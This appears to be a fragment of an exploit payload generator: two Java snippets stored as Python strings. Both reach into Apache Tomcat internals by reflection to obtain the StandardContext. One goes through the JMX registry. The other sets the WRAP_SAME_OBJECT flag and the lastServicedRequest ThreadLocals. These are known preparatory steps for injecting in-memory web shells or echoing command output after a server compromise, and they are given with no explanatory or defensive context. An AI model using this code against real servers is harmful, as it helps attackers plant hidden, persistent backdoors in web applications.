code = """
    private Object getStandardContext() throws Exception {
        Object standardContext = invokeMethod(
                getFieldValue(getLoader(), "resources"),
                "getContext"
        );

        if (standardContext != null) {
            return standardContext;
        }

        Class registry = Class.forName(
            "org.apache.tomcat.util.modeler.Registry"
        );
        Object mbeanServer = invokeMethod(
            getMethodX(registry, "getRegistry", 2)
                .invoke(registry, null, null),
            "getMBeanServer"
        );
        Object mbsInterceptor = getFieldValue(mbeanServer, "mbsInterceptor");
        Object repository = getFieldValue(mbsInterceptor, "repository");
        HashMap domainTb = (HashMap) getFieldValue(repository, "domainTb");
        HashMap catalina = (HashMap) domainTb.get("Catalina");
        Object nonLoginAuthenticator = null;
        Iterator<String> keySet = catalina.keySet().iterator();
        while(keySet.hasNext()) {
            String key = keySet.next();
            if (key.contains("NonLoginAuthenticator")) {
                nonLoginAuthenticator = catalina.get(key);
                break;
            }
        }
        Object object = getFieldValue(nonLoginAuthenticator, "object");
        Object resource = getFieldValue(object, "resource");
        return getFieldValue(resource, "context");
    }
"""

alt = """
        Class applicationDispatcher = Class.forName(
            "org.apache.catalina.core.ApplicationDispatcher"
        );
        Class applicationFilterChain = Class.forName(
            "org.apache.catalina.core.ApplicationFilterChain"
        );

        Field wrap = getField(applicationDispatcher, "WRAP_SAME_OBJECT");
        Field lastServicedRequest = getField(
            applicationFilterChain, "lastServicedRequest"
        );
        Field lastServicedResponse = getField(
            applicationFilterChain, "lastServicedResponse"
        );

        ThreadLocal servletRequest =
            (ThreadLocal) lastServicedRequest.get(null);
        if (servletRequest == null) {
            lastServicedRequest.set(null, new ThreadLocal());
            lastServicedResponse.set(null, new ThreadLocal());
            wrap.setBoolean(null, true);
        }
        return getFieldValue(getFieldValue(invokeMethod(
            servletRequest.get(), "getServletContext"
        ), "context"), "context");
"""